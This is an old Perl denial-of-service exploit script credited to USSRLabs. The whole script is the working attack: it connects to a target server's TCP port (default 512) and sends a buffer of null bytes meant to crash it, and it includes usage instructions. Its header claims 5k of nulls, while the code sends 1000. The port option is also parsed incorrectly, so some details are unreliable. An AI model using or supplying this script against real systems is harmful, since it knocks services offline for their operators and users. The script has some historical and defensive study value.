#!/usr/bin/perl
#########################################################
# Exploit by USSRLabs www.ussrback.com
# send 5k of null causes the server to crash.
#########################################################
#
# ./$0.pl -s <server> -p <port>
#
# Null request DoS
#
use Getopt::Std;
use Socket;

getopts('s:p', \%args);
if(!defined($args{s})){&usage;}

my($serv,$port,$URL,$buf,$in_addr,$paddr,$proto);
$serv = $args{s};                       # remote server
$port = $args{p} || 512;                # remote port, default is 512
$foo = "\0";                            # this is the Null
$number = "1000";                       # this is the total number of Null
$data .= $foo x $number;                # result of $foo times $number
$buf = "$data";                         # issue this response to the server

$in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
$paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
$proto = getprotobyname('tcp') || die("Error: $!\n");

socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!");
connect(S, $paddr) ||die ("Error: $!");
select(S); $| = 1; select(STDOUT);
print S "$buf";

print("Data has been successfully sent to $serv\n");

sub usage {die("\n\n$0 -s <server> [ -p <port> ]\n\n");}
